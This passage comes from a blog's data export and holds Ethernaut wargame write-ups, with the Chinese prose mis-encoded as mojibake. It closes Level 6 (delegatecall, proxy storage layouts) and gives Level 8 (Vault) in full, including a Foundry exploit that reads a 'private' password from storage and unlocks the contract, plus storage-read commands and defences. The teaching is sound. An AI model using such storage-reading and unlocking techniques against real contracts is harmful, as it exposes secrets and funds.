¼çš„å­˜å‚¨å¸ƒå±€åŒ¹é…</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract SafeProxy &#123;</span><br><span class=\"line\">    // âœ… ç¡®ä¿ä»£ç†å’Œå®ç°åˆçº¦æœ‰ç›¸åŒçš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">    address public owner;           // æ§½ 0</span><br><span class=\"line\">    address public implementation; // æ§½ 1</span><br><span class=\"line\">    </span><br><span class=\"line\">    modifier onlyOwner() &#123;</span><br><span class=\"line\">        require(msg.sender == owner, &quot;Not owner&quot;);</span><br><span class=\"line\">        _;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function upgrade(address newImplementation) public onlyOwner &#123;</span><br><span class=\"line\">        implementation = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        address impl = implementation;</span><br><span class=\"line\">        assembly &#123;</span><br><span class=\"line\">            // ä½¿ç”¨å†…è”æ±‡ç¼–è¿›è¡Œæ›´å®‰å…¨çš„ delegatecall</span><br><span class=\"line\">            calldatacopy(0, 0, calldatasize())</span><br><span class=\"line\">            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)</span><br><span class=\"line\">            returndatacopy(0, 0, returndatasize())</span><br><span class=\"line\">            </span><br><span class=\"line\">            switch result</span><br><span class=\"line\">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class=\"line\">            default &#123; return(0, returndatasize()) &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-ä½¿ç”¨-OpenZeppelin-çš„ä»£ç†æ¨¡å¼\"><a href=\"#2-ä½¿ç”¨-OpenZeppelin-çš„ä»£ç†æ¨¡å¼\" class=\"headerlink\" title=\"2. ä½¿ç”¨ OpenZeppelin çš„ä»£ç†æ¨¡å¼\"></a>2. ä½¿ç”¨ OpenZeppelin çš„ä»£ç†æ¨¡å¼</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol&quot;;</span><br><span class=\"line\">import &quot;@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SecureUpgradeableContract &#123;</span><br><span class=\"line\">    // ä½¿ç”¨ OpenZeppelin çš„æ ‡å‡†åŒ–ä»£ç†å®ç°</span><br><span class=\"line\">    // åŒ…å«å®Œæ•´çš„å®‰å…¨æ£€æŸ¥å’Œå­˜å‚¨éš”ç¦»</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å‡½æ•°é€‰æ‹©å™¨ç™½åå•\"><a href=\"#3-å‡½æ•°é€‰æ‹©å™¨ç™½åå•\" class=\"headerlink\" title=\"3. å‡½æ•°é€‰æ‹©å™¨ç™½åå•\"></a>3. å‡½æ•°é€‰æ‹©å™¨ç™½åå•</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract RestrictedDelegation &#123;</span><br><span class=\"line\">    mapping(bytes4 =&gt; bool) public allowedSelectors;</span><br><span class=\"line\">    </span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        // åªå…è®¸ç‰¹å®šå‡½æ•°è¢« delegatecall</span><br><span class=\"line\">        allowedSelectors[bytes4(keccak256(&quot;safeFunction()&quot;))] = true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    fallback() external &#123;</span><br><span class=\"line\">        bytes4 selector = bytes4(msg.data);</span><br><span class=\"line\">        require(allowedSelectors[selector], &quot;Function not allowed&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // æ‰§è¡Œ delegatecall</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-å­˜å‚¨æ§½éš”ç¦»\"><a href=\"#4-å­˜å‚¨æ§½éš”ç¦»\" class=\"headerlink\" title=\"4. å­˜å‚¨æ§½éš”ç¦»\"></a>4. å­˜å‚¨æ§½éš”ç¦»</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract IsolatedStorage &#123;</span><br><span class=\"line\">    // ä½¿ç”¨ EIP-1967 æ ‡å‡†å­˜å‚¨æ§½</span><br><span class=\"line\">    bytes32 private constant IMPLEMENTATION_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.implementation&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    bytes32 private constant ADMIN_SLOT = </span><br><span class=\"line\">        bytes32(uint256(keccak256(&#x27;eip1967.proxy.admin&#x27;)) - 1);</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _getImplementation() internal view returns (address) &#123;</span><br><span class=\"line\">        return StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function _setImplementation(address newImplementation) internal &#123;</span><br><span class=\"line\">        StorageSlot.getAddressSlot(IMPLEMENTATION_SLOT).value = newImplementation;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\"><a href=\"#ğŸ“š-æ ¸å¿ƒçŸ¥è¯†ç‚¹\" class=\"headerlink\" title=\"ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹\"></a>ğŸ“š æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id=\"1-EVM-è°ƒç”¨ç±»å‹å¯¹æ¯”\"><a href=\"#1-EVM-è°ƒç”¨ç±»å‹å¯¹æ¯”\" class=\"headerlink\" title=\"1. EVM è°ƒç”¨ç±»å‹å¯¹æ¯”\"></a>1. EVM è°ƒç”¨ç±»å‹å¯¹æ¯”</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract CallExample &#123;</span><br><span class=\"line\">    function demonstrateCalls(address target) public &#123;</span><br><span class=\"line\">        // 1. call - æ™®é€šå¤–éƒ¨è°ƒç”¨</span><br><span class=\"line\">        (bool success1,) = target.call(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 2. delegatecall - å§”æ‰˜è°ƒç”¨</span><br><span class=\"line\">        (bool success2,) = target.delegatecall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;someFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 3. staticcall - åªè¯»è°ƒç”¨</span><br><span class=\"line\">        (bool success3,) = target.staticcall(</span><br><span class=\"line\">            abi.encodeWithSignature(&quot;viewFunction()&quot;)</span><br><span class=\"line\">        );</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-å­˜å‚¨æ§½å†²çªç¤ºä¾‹\"><a href=\"#2-å­˜å‚¨æ§½å†²çªç¤ºä¾‹\" class=\"headerlink\" title=\"2. å­˜å‚¨æ§½å†²çªç¤ºä¾‹\"></a>2. å­˜å‚¨æ§½å†²çªç¤ºä¾‹</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// âŒ å±é™©ï¼šä¸åŒ¹é…çš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">contract ProxyV1 &#123;</span><br><span class=\"line\">    address public owner;    // æ§½ 0</span><br><span class=\"line\">    uint256 public value;    // æ§½ 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV1 &#123;</span><br><span class=\"line\">    uint256 public data;     // æ§½ 0 â† å†²çªï¼</span><br><span class=\"line\">    address public admin;    // æ§½ 1 â† å†²çªï¼</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// âœ… å®‰å…¨ï¼šåŒ¹é…çš„å­˜å‚¨å¸ƒå±€</span><br><span class=\"line\">contract ProxyV2 &#123;</span><br><span class=\"line\">    address public owner;    // æ§½ 0</span><br><span class=\"line\">    uint256 public value;    // æ§½ 1</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract ImplementationV2 &#123;</span><br><span class=\"line\">    address public owner;    // æ§½ 0 â† åŒ¹é…</span><br><span class=\"line\">    uint256 public value;    // æ§½ 1 â† åŒ¹é…</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\"><a href=\"#3-å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\" class=\"headerlink\" title=\"3. å‡½æ•°é€‰æ‹©å™¨è®¡ç®—\"></a>3. å‡½æ•°é€‰æ‹©å™¨è®¡ç®—</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function calculateSelector() public pure returns (bytes4) &#123;</span><br><span class=\"line\">    // æ–¹æ³• 1ï¼šç›´æ¥è®¡ç®—</span><br><span class=\"line\">    bytes4 selector1 = bytes4(keccak256(&quot;pwn()&quot;));</span><br><span class=\"line\">    </span><br><span class=\"line\">    // æ–¹æ³• 2ï¼šä½¿ç”¨ abi.encodeWithSignature</span><br><span class=\"line\">    bytes memory data = abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class=\"line\">    bytes4 selector2 = bytes4(data);</span><br><span class=\"line\">    </span><br><span class=\"line\">    // æ–¹æ³• 3ï¼šä½¿ç”¨ this.functionName.selector</span><br><span class=\"line\">    // bytes4 selector3 = this.pwn.selector; // å¦‚æœå‡½æ•°å­˜åœ¨</span><br><span class=\"line\">    </span><br><span class=\"line\">    return selector1;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ğŸ›ï¸-å®é™…åº”ç”¨åœºæ™¯\"><a href=\"#ğŸ›ï¸-å®é™…åº”ç”¨åœºæ™¯\" class=\"headerlink\" title=\"ğŸ›ï¸ å®é™…åº”ç”¨åœºæ™¯\"></a>ğŸ›ï¸ å®é™…åº”ç”¨åœºæ™¯</h2><h3 id=\"ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\"><a href=\"#ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\" class=\"headerlink\" title=\"ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨\"></a>ä»£ç†æ¨¡å¼çš„æ­£ç¡®ä½¿ç”¨</h3><ol>\n<li><p><strong>å‡çº§æ¨¡å¼</strong>ï¼š</p>\n<ul>\n<li>UUPS (Universal Upgradeable Proxy Standard)</li>\n<li>Transparent Proxy Pattern</li>\n<li>Beacon Proxy Pattern</li>\n</ul>\n</li>\n<li><p><strong>é’»çŸ³æ¨¡å¼</strong> (EIP-2535)ï¼š</p>\n<ul>\n<li>å¤šé¢åˆ‡å‰²åˆçº¦</li>\n<li>åŠŸèƒ½æ¨¡å—åŒ–</li>\n</ul>\n</li>\n<li><p><strong>æœ€å°ä»£ç†</strong> (EIP-1167)ï¼š</p>\n<ul>\n<li>Clone Factory Pattern</li>\n<li>èŠ‚çœéƒ¨ç½²æˆæœ¬</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p>Delegation å…³å¡æ­ç¤ºäº† <code>delegatecall</code> çš„åŒåˆƒå‰‘ç‰¹æ€§ï¼š</p>\n<ul>\n<li>âœ… <strong>ç†è§£ä¸Šä¸‹æ–‡åˆ‡æ¢æœºåˆ¶</strong> - ä»£ç åœ¨ä¸åŒå­˜å‚¨ç©ºé—´æ‰§è¡Œ</li>\n<li>âœ… <strong>æŒæ¡å­˜å‚¨æ§½å¸ƒå±€åŒ¹é…</strong> - ä»£ç†å’Œå®ç°å¿…é¡»ä¸€è‡´</li>\n<li>âœ… <strong>å­¦ä¹ å®‰å…¨ä»£ç†æ¨¡å¼</strong> - ä½¿ç”¨æ ‡å‡†åŒ–è§£å†³æ–¹æ¡ˆ</li>\n<li>âœ… <strong>è®¤è¯†å‡½æ•°é€‰æ‹©å™¨å®‰å…¨</strong> - æ§åˆ¶å¯è°ƒç”¨çš„å‡½æ•°</li>\n</ul>\n<p><code>delegatecall</code> æ˜¯å®ç°åˆçº¦å‡çº§å’Œæ¨¡å—åŒ–çš„é‡è¦å·¥å…·ï¼Œä½†ä¹Ÿæ˜¯è®¸å¤šå®‰å…¨æ¼æ´çš„æ ¹æºã€‚ç†è§£å…¶å·¥ä½œåŸç†å¯¹äºæ„å»ºå®‰å…¨çš„å¯å‡çº§åˆçº¦è‡³å…³é‡è¦ã€‚</p>\n<hr>\n<h2 id=\"ğŸ”—-ç›¸å…³é“¾æ¥\"><a href=\"#ğŸ”—-ç›¸å…³é“¾æ¥\" class=\"headerlink\" title=\"ğŸ”— ç›¸å…³é“¾æ¥\"></a>ğŸ”— ç›¸å…³é“¾æ¥</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-05-token/\">ä¸Šä¸€å…³: Level 5 - Token</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-07-force/\">ä¸‹ä¸€å…³: Level 7 - Force</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/4.x/api/proxy\">OpenZeppelin ä»£ç†æ–‡æ¡£</a></strong></li>\n<li><strong><a href=\"https://eips.ethereum.org/EIPS/eip-1967\">EIP-1967: Standard Proxy Storage Slots</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub é¡¹ç›®</a></strong></li>\n</ul>\n<hr>\n<p><em>åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œä¸­ï¼Œä¸Šä¸‹æ–‡å°±æ˜¯ä¸€åˆ‡ã€‚</em> ğŸ”„</p>\n"},{"title":"Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–","date":"2025-01-25T07:30:00.000Z","updated":"2025-01-25T07:30:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"æ·±å…¥å­¦ä¹ åŒºå—é“¾å­˜å‚¨æœºåˆ¶å’Œç§æœ‰å˜é‡è¯»å–æ”»å‡»ï¼ŒæŒæ¡ Vault å…³å¡çš„æ”»å‡»æŠ€æœ¯å’Œé˜²æŠ¤æªæ–½ã€‚ç†è§£ EVM å­˜å‚¨å¸ƒå±€å’Œ eth_getStorageAt çš„ä½¿ç”¨ã€‚","_content":"\n# ğŸ¯ Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–\n\n> **å…³å¡é“¾æ¥**: [Ethernaut Level 8 - Vault](https://ethernaut.openzeppelin.com/level/8)  \n> **æ”»å‡»ç±»å‹**: ç§æœ‰å˜é‡è¯»å–  \n> **éš¾åº¦**: â­â­â­â˜†â˜†\n\n## ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\n\nè¦ unlock è¿™ä¸ªåˆçº¦è´¦æˆ·ï¼Œä¹Ÿå°±æ˜¯è¦æ‰¾åˆ° passwordã€‚æŒ‘æˆ˜çš„å…³é”®åœ¨äºç†è§£åŒºå—é“¾ä¸Šæ²¡æœ‰çœŸæ­£çš„\"ç§æœ‰\"æ•°æ®ï¼Œæ‰€æœ‰çŠ¶æ€å˜é‡éƒ½å¯ä»¥è¢«è¯»å–ã€‚\n\n![Vault Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel8.svg)\n\n## ğŸ” æ¼æ´åˆ†æ\n\n### å­˜å‚¨æœºåˆ¶ (Storage)\n\næˆ‘ä»¬éœ€è¦ç†è§£ EVM ä¸­å­˜å‚¨çš„å¸ƒå±€ä»¥åŠåŸç†ï¼ˆä½¿ç”¨ 32 å­—èŠ‚å¤§å°çš„æ’æ§½ï¼‰å’Œ JSON RPC å‡½æ•° `eth_getStorageAt`ã€‚\n\nEVM çš„æ•°æ®éƒ½å­˜åœ¨ 32 å­—èŠ‚æ§½ä¸­ï¼š\n- ç¬¬ä¸€ä¸ªçŠ¶æ€å˜é‡å­˜å‚¨åœ¨æ§½ä½ 0\n- å¦‚æœç¬¬ä¸€ä¸ªå˜é‡å­˜å‚¨å®Œäº†è¿˜æœ‰è¶³å¤Ÿçš„å­—èŠ‚ï¼Œä¸‹ä¸€ä¸ªå˜é‡ä¹Ÿå­˜å‚¨åœ¨ slot 0\n- å¦åˆ™å­˜å‚¨åœ¨ slot 1ï¼Œä¾æ­¤ç±»æ¨\n\n> **æ³¨æ„**: åƒæ•°ç»„å’Œå­—ç¬¦ä¸²è¿™æ ·çš„åŠ¨æ€ç±»å‹å·¥ä½œæ–¹å¼ä¸åŒ\n\nåœ¨ Vault åˆçº¦ä¸­ï¼š\n- `locked` æ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼Œä½¿ç”¨ 1 å­—èŠ‚ï¼Œå­˜å‚¨åœ¨ slot 0\n- `password` æ˜¯ä¸€ä¸ª bytes32ï¼Œä½¿ç”¨ 32 ä¸ªå­—èŠ‚\n- ç”±äºæ’æ§½ 0 ä¸­å‰©ä½™çš„ 31 ä¸ªå­—èŠ‚æ— æ³•å®¹çº³ passwordï¼Œå› æ­¤å®ƒè¢«å­˜å‚¨åœ¨ slot 1 ä¸­\n\n### è¯»å– Storage\n\n`eth_getStorageAt` JSON RPC å‡½æ•°å¯ç”¨äºè¯»å–åˆçº¦åœ¨ç»™å®šæ§½ä½çš„å­˜å‚¨ã€‚\n\nä½¿ç”¨ web3.js è¯»å– slot 1 çš„åˆçº¦å­˜å‚¨ï¼š\n\n```javascript\nweb3.eth.getStorageAt(contractAddress, 1, (err, result) => {\n  console.log(result);\n});\n```\n\nåœ¨ Foundry ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ cheatcodes ä¸­çš„ loadï¼š\n\n```solidity\nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n```\n\n## ğŸ’» Foundry å®ç°\n\n### æ”»å‡»åˆçº¦ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"../src/Ethernaut.sol\";\nimport \"../src/levels/VaultFactory.sol\";\n\ncontract VaultTest is Test {\n    Ethernaut ethernaut;\n    VaultFactory vaultFactory;\n    \n    function setUp() public {\n        ethernaut = new Ethernaut();\n        vaultFactory = new VaultFactory();\n        ethernaut.registerLevel(vaultFactory);\n    }\n    \n    function testVaultExploit() public {\n        // åˆ›å»ºå…³å¡å®ä¾‹\n        address levelInstance = ethernaut.createLevelInstance(vaultFactory);\n        Vault instance = Vault(levelInstance);\n        \n        // éªŒè¯åˆå§‹çŠ¶æ€\n        assertEq(instance.locked(), true);\n        \n        // æ”»å‡»ï¼šè¯»å–å­˜å‚¨åœ¨ slot 1 ä¸­çš„å¯†ç \n        bytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n        \n        // ä½¿ç”¨è¯»å–çš„å¯†ç è§£é”\n        instance.unlock(password);\n        \n        // éªŒè¯æ”»å‡»æˆåŠŸ\n        assertEq(instance.locked(), false);\n        \n        // æäº¤å…³å¡\n        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(\n            payable(levelInstance)\n        );\n        assert(levelSuccessfullyPassed);\n    }\n}\n```\n\n### å…³é”®æ”»å‡»æ­¥éª¤\n\n1. **åˆ†æå­˜å‚¨å¸ƒå±€**ï¼šç¡®å®š password å­˜å‚¨åœ¨ slot 1\n2. **è¯»å–å­˜å‚¨**ï¼šä½¿ç”¨ `vm.load()` è¯»å– slot 1 çš„æ•°æ®\n3. **è°ƒç”¨ unlock**ï¼šä½¿ç”¨è¯»å–çš„å¯†ç è§£é”åˆçº¦\n\n```solidity\n// è¯»å– slot 1 ä¸­çš„å¯†ç \nbytes32 password = vm.load(address(instance), bytes32(uint256(1)));\n\n// è§£é”åˆçº¦\ninstance.unlock(password);\n\n// éªŒè¯è§£é”æˆåŠŸ\nassertEq(instance.locked(), false);\n```\n\n## ğŸ›¡ï¸ é˜²å¾¡æªæ–½\n\n### 1. é¿å…åœ¨é“¾ä¸Šå­˜å‚¨æ•æ„Ÿæ•°æ®\n\n```solidity\n// âŒ ä¸å®‰å…¨ï¼šå¯†ç å­˜å‚¨åœ¨é“¾ä¸Š\ncontract VulnerableVault {\n    bytes32 private password;  // å¯ä»¥è¢«è¯»å–ï¼\n    \n    constructor(bytes32 _password) {\n        password = _password;\n    }\n}\n\n// âœ… å®‰å…¨ï¼šä½¿ç”¨å“ˆå¸ŒéªŒè¯\ncontract SecureVault {\n    bytes32 private passwordHash;  // å­˜å‚¨å“ˆå¸Œè€Œä¸æ˜¯æ˜æ–‡\n    \n    constructor(bytes32 _passwordHash) {\n        passwordHash = _passwordHash;\n    }\n    \n    function unlock(string memory _password) public {\n        require(keccak256(abi.encodePacked(_password)) == passwordHash, \"Wrong password\");\n        // unlock logic\n    }\n}\n```\n\n### 2. ä½¿ç”¨æäº¤-æ­ç¤ºæ–¹æ¡ˆ\n\n```solidity\ncontract CommitRevealVault {\n    mapping(address => bytes32) private commitments;\n    \n    // ç¬¬ä¸€é˜¶æ®µï¼šæäº¤å“ˆå¸Œ\n    function commit(bytes32 _commitment) public {\n        commitments[msg.sender] = _commitment;\n    }\n    \n    // ç¬¬äºŒé˜¶æ®µï¼šæ­ç¤ºå¹¶éªŒè¯\n    function reveal(string memory _password, uint256 _nonce) public {\n        bytes32 hash = keccak256(abi.encodePacked(_password, _nonce));\n        require(commitments[msg.sender] == hash, \"Invalid reveal\");\n        // unlock logic\n    }\n}\n```\n\n### 3. ä½¿ç”¨é“¾ä¸‹éªŒè¯\n\n```solidity\ncontract OffChainVault {\n    address private authorizedSigner;\n    mapping(address => bool) private unlocked;\n    \n    function unlock(bytes memory signature, address user) public {\n        bytes32 messageHash = keccak256(abi.encodePacked(user, \"unlock\"));\n        address signer = recoverSigner(messageHash, signature);\n        require(signer == authorizedSigner, \"Unauthorized\");\n        unlocked[user] = true;\n    }\n}\n```\n\n## ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\n\n### å­˜å‚¨è¯»å–å·¥å…·\n\n```bash\n# ä½¿ç”¨ cast è¯»å–å­˜å‚¨\ncast storage <CONTRACT_ADDRESS> <SLOT_NUMBER>\n\n# ä½¿ç”¨ web3.py\nfrom web3 import Web3\nw3 = Web3(Web3.HTTPProvider('http://localhost:8545'))\npassword = w3.eth.get_storage_at(contract_address, 1)\n```\n\n### å­˜å‚¨å¸ƒå±€åˆ†æ\n\n```solidity\n// ä½¿ç”¨ forge inspect æŸ¥çœ‹å­˜å‚¨å¸ƒå±€\n// forge inspect <CONTRACT> storage-layout\n```\n\n## ğŸ¯ æ€»ç»“\n\n**æ ¸å¿ƒæ¦‚å¿µ**:\n- `private` å…³é”®å­—æ„å‘³ç€æ•°æ®åªèƒ½ç”±åˆçº¦æœ¬èº«è®¿é—®ï¼Œè€Œä¸æ˜¯å¯¹å¤–ç•Œéšè—\n- åŒºå—é“¾ä¸Šæ²¡æœ‰ä»€ä¹ˆæ˜¯ç§æœ‰çš„ï¼Œä¸€åˆ‡éƒ½æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥é˜…è¯»\n- EVM å­˜å‚¨ä½¿ç”¨ 32 å­—èŠ‚çš„æ’æ§½ç³»ç»Ÿ\n\n**æ”»å‡»å‘é‡**:\n- ç›´æ¥è¯»å–åˆçº¦å­˜å‚¨\n- åˆ†æå­˜å‚¨å¸ƒå±€ç¡®å®šæ•æ„Ÿæ•°æ®ä½ç½®\n- ä½¿ç”¨ RPC è°ƒç”¨æˆ– Foundry cheatcodes è¯»å–æ•°æ®\n\n**é˜²å¾¡ç­–ç•¥**:\n- æ°¸è¿œä¸è¦åœ¨é“¾ä¸Šå­˜å‚¨æ˜æ–‡æ•æ„Ÿæ•°æ®\n- ä½¿ç”¨å“ˆå¸Œå’Œæ‰¿è¯ºæ–¹æ¡ˆ\n- è€ƒè™‘é“¾ä¸‹éªŒè¯æœºåˆ¶\n- å®æ–½é€‚å½“çš„è®¿é—®æ§åˆ¶\n\n---\n\n## ğŸ”— ç›¸å…³é“¾æ¥\n\n- **[ç³»åˆ—ç›®å½•: Ethernaut Foundry Solutions](/2025/01/25/ethernaut-foundry-solutions-series/)**\n- **[ä¸Šä¸€å…³: Level 7 - Force](/2025/01/25/ethernaut-level-07-force/)**\n- **[ä¸‹ä¸€å…³: Level 9 - King](/2025/01/25/ethernaut-level-09-king/)**\n- **[GitHub é¡¹ç›®](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n\n","source":"_posts/ethernaut-level-08-vault.md","raw":"---\ntitle: 'Ethernaut Level 8: Vault - ç§æœ‰å˜é‡è¯»å–'\ndate: 2025-01-25 15:30:00\nupdated: 2025-01-25 15:30:00\ncategories:\n  - Ethernaut ç³»åˆ—\n  - åŸºç¡€æ”»å‡»ç¯‡ (1-10)\ntags:\n  - Ethernaut\n  - Foundry\n  - ç§æœ‰å˜é‡è¯»å–\n  - æ™ºèƒ½åˆçº¦å®‰å…¨\n  - Solidity\n  - Storage\nseries: Ethernaut Foundry Solutions\nexcerpt: \"æ·±å…¥å­¦ä¹ åŒºå—é“¾å­˜å‚¨æœºåˆ¶å’Œç§æœ‰å˜é‡è¯»å–æ”»å‡»ï¼ŒæŒæ¡ Vault 